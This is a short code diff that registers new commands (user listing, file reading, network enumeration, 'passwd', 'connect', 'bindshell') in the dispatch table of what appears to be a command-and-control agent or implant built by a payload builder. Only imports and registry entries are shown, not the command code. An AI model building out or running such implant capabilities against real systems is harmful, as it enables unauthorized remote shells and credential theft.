@@ -25,6 +25,15 @@ from commands import config as agent_config
 from commands import runpy as cmd_runpy
 from commands import campaign as cmd_campaign
 from commands import ps as cmd_ps
+from commands import users as cmd_users
+from commands import cat as cmd_cat
+from commands import route as cmd_route
+from commands import ss as cmd_ss
+from commands import netstat as cmd_netstat
+from commands import ifconfig as cmd_ifconfig
+from commands import passwd as cmd_passwd
+from commands import connect as cmd_connect
+from commands import bindshell as cmd_bindshell
 
 
 # --- Injected by builder via string substitution ---
@@ -127,6 +136,15 @@ COMMANDS = {
     "runpy":    cmd_runpy.execute,
     "campaign": cmd_campaign.execute,
     "ps":       cmd_ps.execute,
+    "users":    cmd_users.execute,
+    "cat":      cmd_cat.execute,
+    "route":    cmd_route.execute,
+    "ss":       cmd_ss.execute,
+    "netstat":  cmd_netstat.execute,
+    "ifconfig": cmd_ifconfig.execute,
+    "passwd":   cmd_passwd.execute,
+    "connect":   cmd_connect.execute,
+    "bindshell": cmd_bindshell.execute,
 }
 
 # Handles a single task by looking up the command in the registry and executing it
